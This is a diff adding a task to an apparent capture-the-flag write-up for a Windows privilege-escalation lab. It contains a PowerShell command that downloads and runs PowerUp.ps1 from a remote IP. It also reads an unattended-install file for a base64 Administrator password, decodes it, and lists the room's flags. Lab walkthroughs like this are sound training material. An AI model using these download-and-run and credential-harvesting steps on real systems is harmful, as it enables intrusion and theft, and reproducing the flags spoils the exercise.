@@ -269,3 +269,44 @@ psexec -u corp\fela -p password cmd
 ```
 
 flag is flag{bde1642535aa396d2439d86fe54a36e4}
+
+
+Task 4:
+
+
+PS C:\Users\dark> iex(New-Object Net.WebClient).DownloadString('http://10.67.105.46:80/PowerUp.ps1')
+PS C:\Users\dark> type C:\Windows\Panther\Unattend\Unattended.xml
+<AutoLogon>
+    <Password>
+        <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
+        <PlainText>false</PlainText>
+    </Password>
+    <Enabled>true</Enabled>
+    <Username>Administrator</Username>
+</AutoLogon>
+
+That base64 value is the password for Administrator, just need to convert it. I just used notepad saved as hash.txt then
+
+PS > $b64="dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ="
+PS > [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
+ tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
+
+A clearer way:
+
+PS > $b64 = "dHF..."
+PS > $bytes = [System.Convert]::FromBase64String($b64)
+PS > $bytes  
+    tqj...
+ 
+or certutil has so many options that need to be explored:
+
+PS > certutil.exe -decode "C:\users\dark\hash.txt" decode.txt`
+...
+CertUtil: -decode command completed successfully.
+PS > type '.\decode.txt`'
+tqj...
+
+Then use to login or upload payload to 
+THM{g00d_j0b_SYS4DM1n_M4s73R}
+
+
